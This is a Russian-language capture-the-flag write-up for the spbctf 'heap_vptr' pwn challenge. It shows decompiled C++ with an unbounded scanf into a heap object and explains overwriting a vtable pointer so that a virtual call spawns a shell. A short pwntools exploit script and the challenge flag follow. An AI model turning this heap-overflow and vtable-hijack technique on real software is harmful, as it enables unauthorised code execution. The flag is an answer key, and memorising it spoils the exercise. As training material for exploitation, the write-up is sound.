[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn7_heap_vptr)
Описание:
Flag is in flag.txt
`nc 109.233.56.90 11580`
**[heap_vp.elf](https://pwn.spbctf.ru/files/heap/heap_vptr/heap_vp.elf)**

Main:
``` c++
int __fastcall main(int argc, const char **argv, const char **envp)
{
  Student *student1; // rbx
  Student *student2; // rbx
  const char *student1_ptr; // [rsp+0h] [rbp-20h]

  student1 = operator new(0x28u);
  *student1 = 0;
  *(student1 + 1) = 0;
  *(student1 + 2) = 0;
  *(student1 + 3) = 0;
  *(student1 + 4) = 0;
  Student::Student(student1);
  student1_ptr = student1;

  student2 = operator new(0x28u);
  *student2 = 0;
  *(student2 + 1) = 0;
  *(student2 + 2) = 0;
  *(student2 + 3) = 0;
  *(student2 + 4) = 0;
  Student::Student(student2);

  setvbuf(stdout, nullptr, 2, 0);

  printf("%p %p %p\n", student1_ptr, student2, main);
  __isoc99_scanf("%s", student1_ptr + 8);
  puts(student1_ptr + 8);
  (**student2)(student2);
  return 0;
}
```

В инициализации настраивается таблица виртуальных методов.
``` C++
// Alternative name is '_ZN7StudentC1Ev'
void __fastcall Student::Student(Student *this)
{
  *this = off_3DA8;
}

// .data.rel.ro:0000000000003DA8 off_3DA8        dq offset _ZN7Student3GetEv
// .data.rel.ro:0000000000003DA8                                         ; DATA XREF:
// Student::Student(void)+8↑o
// .data.rel.ro:0000000000003DA8                                         ;
// Student::Get(void)
// .data.rel.ro:0000000000003DB0                 dq offset _ZN7Student5ShellEv ;
// Student::Shell(void)
```

Вот эти методы:
``` c++
__int64 __fastcall Student::Get(Student *this)
{
  system("date");
  return 0;
}

__int64 __fastcall Student::Shell(Student *this)
{
  system("sh");
  return 0;
}
```

Необходимо переполнить буфер и перезаписать адрес начала таблицы с `Get` на `Shell`.
![{80EA667B-843A-4722-AEEC-BC661FD7F663}](../../../../z.%20Images/{80EA667B-843A-4722-AEEC-BC661FD7F663}.png)
Под qira видно, что необходимо 0x28 байт паддинга + изменение адреса таблицы с 0x3da8 на 0x3db0.

Эксплоит:
``` python
main_offset = 0x11C9
shell_offset = 0x3DB0

io = start()

main = int(io.recvline().decode().split(' ')[-1], 16)
shell = main - main_offset + shell_offset

payload = b'A' * 0x28 + p64(shell)
io.sendline(payload)
io.sendline(b'cat flag.txt')

io.interactive()
```

Запуск:
![{31D3AFF8-6E95-47EB-B6AA-28946061BAA7}](../../../../z.%20Images/{31D3AFF8-6E95-47EB-B6AA-28946061BAA7}.png)

Ответ: `SPBCTF{H34P_N_VP7R_4_FUN}`